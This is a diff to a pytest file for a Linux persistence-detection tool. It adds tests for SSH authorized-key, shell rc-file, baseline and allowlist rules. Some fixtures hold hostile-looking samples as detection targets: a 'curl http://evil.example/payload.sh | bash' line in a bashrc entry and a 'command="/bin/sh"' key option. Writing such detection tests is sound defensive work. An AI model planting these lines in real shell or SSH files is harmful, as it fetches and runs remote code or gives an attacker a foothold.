@@ -17,6 +17,8 @@ from ubuntils.detectors.rules import (
     rule_suspicious_systemd_timer,
     rule_uid_zero_account,
 )
+from ubuntils.utils.baseline import Baseline
+from ubuntils.utils.config import Allowlist
 
 # ---------------------------------------------------------------------------
 # Shared helpers
@@ -215,6 +217,30 @@ def test_rule_ssh_unauthorized_key_empty_artifacts():
     assert rule_ssh_unauthorized_key({}) == []
 
 
+def test_ssh_rule_bare_mtime_touch_is_low_confidence():
+    # ctime NOT recent (file existed, only mtime was touched), no dangerous options.
+    old_ctime = time.time() - 400 * 24 * 3600
+    entry = _ssh_key_entry(file_mtime=time.time() - 3600)
+    entry["file_ctime"] = old_ctime
+    entry["options"] = ""
+    findings = rule_ssh_unauthorized_key({"authorized_keys": [entry]})
+    assert len(findings) == 1
+    assert findings[0].confidence_band == "LOW"
+    assert findings[0].signals[0]["name"] == "mtime_only"
+
+
+def test_ssh_rule_dangerous_option_is_high_confidence():
+    entry = _ssh_key_entry(file_mtime=time.time() - 3600)
+    entry["file_ctime"] = time.time() - 3600
+    entry["options"] = 'command="/bin/sh"'
+    findings = rule_ssh_unauthorized_key({"authorized_keys": [entry]})
+    assert len(findings) == 1
+    assert findings[0].confidence_band == "HIGH"
+    signal_names = {s["name"] for s in findings[0].signals}
+    assert "content_match" in signal_names
+    assert "ctime_corroborates_mtime" in signal_names
+
+
 # ---------------------------------------------------------------------------
 # SUDOERS_NOPASSWD
 # ---------------------------------------------------------------------------
@@ -330,12 +356,12 @@ def test_rule_shell_rc_modification_detects_bad(tmp_path):
     recent_mtime = time.time() - 3600  # 1 hour ago
     os.utime(bashrc, (recent_mtime, recent_mtime))
 
-    artifacts = {"env_definitions": [{
+    artifacts = {"shell_init_files": [{
         "owner": "alice",
         "source": str(bashrc),
-        "variable": "PATH",
-        "value": "/usr/local/bin:$PATH",
-        "raw_line": "export PATH=/usr/local/bin:$PATH",
+        "mtime": recent_mtime,
+        "ctime": time.time() - 400 * 24 * 3600,
+        "content": "export PATH=/usr/local/bin:$PATH\n",
     }]}
     findings = rule_shell_rc_modification(artifacts)
     assert len(findings) == 1
@@ -394,22 +420,48 @@ def test_rule_shell_rc_modification_non_init_file_no_finding(tmp_path):
     assert findings == []
 
 
-def test_rule_shell_rc_modification_deduplicates(tmp_path):
-    bashrc = tmp_path / ".bashrc"
-    bashrc.write_text("export A=1\nexport B=2\n")
-    recent_mtime = time.time() - 3600
-    os.utime(bashrc, (recent_mtime, recent_mtime))
-
-    artifacts = {"env_definitions": [
-        {"owner": "alice", "source": str(bashrc), "variable": "A", "value": "1", "raw_line": "export A=1"},
-        {"owner": "alice", "source": str(bashrc), "variable": "B", "value": "2", "raw_line": "export B=2"},
-    ]}
-    findings = rule_shell_rc_modification(artifacts)
-    assert len(findings) == 1
-
-
 def test_rule_shell_rc_modification_empty_artifacts():
     assert rule_shell_rc_modification({}) == []
+
+
+def _rc_file_entry(owner="alice", source="/home/alice/.bashrc", mtime=None, ctime=None,
+                    content="export PATH=$PATH:/usr/local/bin\n"):
+    now = time.time()
+    return {
+        "owner": owner, "source": source,
+        "mtime": mtime if mtime is not None else now - 3600,
+        "ctime": ctime if ctime is not None else now - 400 * 24 * 3600,
+        "content": content,
+    }
+
+
+def test_shell_rc_rule_bare_touch_is_low_confidence():
+    findings = rule_shell_rc_modification({"shell_init_files": [_rc_file_entry()]})
+    assert len(findings) == 1
+    assert findings[0].confidence_band == "LOW"
+
+
+def test_shell_rc_rule_curl_to_shell_is_high_confidence():
+    entry = _rc_file_entry(
+        content="curl http://evil.example/payload.sh | bash\n",
+        ctime=time.time() - 3600,
+    )
+    findings = rule_shell_rc_modification({"shell_init_files": [entry]})
+    assert len(findings) == 1
+    assert findings[0].confidence_band == "HIGH"
+    signal_names = {s["name"] for s in findings[0].signals}
+    assert "content_match" in signal_names
+    assert "ctime_corroborates_mtime" in signal_names
+
+
+def test_shell_rc_rule_never_reads_the_analyst_filesystem(tmp_path, monkeypatch):
+    # Regression guard for the os.stat-bypass bug: the rule must derive
+    # everything from the artifacts dict, never touch the real filesystem.
+    def _boom(*a, **kw):
+        raise AssertionError("rule_shell_rc_modification must not call os.stat")
+    monkeypatch.setattr("os.stat", _boom)
+    findings = rule_shell_rc_modification({"shell_init_files": [_rc_file_entry()]})
+    assert len(findings) == 1
 
 
 # ---------------------------------------------------------------------------
@@ -581,8 +633,30 @@ def test_shell_rc_modification_has_guided_remediation(tmp_path):
     rc = tmp_path / ".bashrc"
     rc.write_text("export PATH=$PATH\n")
     os.utime(str(rc), (time.time(), time.time()))
-    artifacts = {"env_definitions": [
-        {"owner": "alice", "source": str(rc), "variable": "PATH", "value": "x"}]}
+    artifacts = {"shell_init_files": [
+        {"owner": "alice", "source": str(rc), "mtime": time.time(),
+         "ctime": time.time() - 400 * 24 * 3600, "content": "export PATH=$PATH\n"}]}
     findings = rule_shell_rc_modification(artifacts)
     assert findings[0].remediation_available is False
     assert str(rc) in findings[0].guided_remediation
+
+
+def test_engine_applies_baseline_before_allowlist_and_counts_suppressed():
+    """Baseline and allowlist suppress two *different* findings, proving the
+    two mechanisms compose: baseline drops SSH_UNAUTHORIZED_KEY (counted),
+    allowlist drops USER_UID_ZERO (not baseline-counted), and both are gone
+    from the final result."""
+    artifacts = {
+        "authorized_keys": [_ssh_key_entry()],
+        "users": [_user_entry(username="ghost", uid=0, shell="/bin/bash")],
+    }
+    baseline = Baseline(entries=[{"rule_id": "SSH_UNAUTHORIZED_KEY", "fingerprint": "test@host"}])
+    allowlist = Allowlist(rules=["USER_UID_ZERO"])
+    engine = DetectionEngine(baseline=baseline, allowlist=allowlist)
+    findings = engine.run(artifacts)
+    assert not any(f.rule_id == "SSH_UNAUTHORIZED_KEY" for f in findings)
+    assert not any(f.rule_id == "USER_UID_ZERO" for f in findings)
+    # Only the baseline-matched finding is counted by suppressed_by_baseline;
+    # the allowlist-suppressed one is not double-counted or miscounted.
+    assert engine.suppressed_by_baseline == 1
+    assert [f.rule_id for f in engine.baseline_suppressed_findings] == ["SSH_UNAUTHORIZED_KEY"]
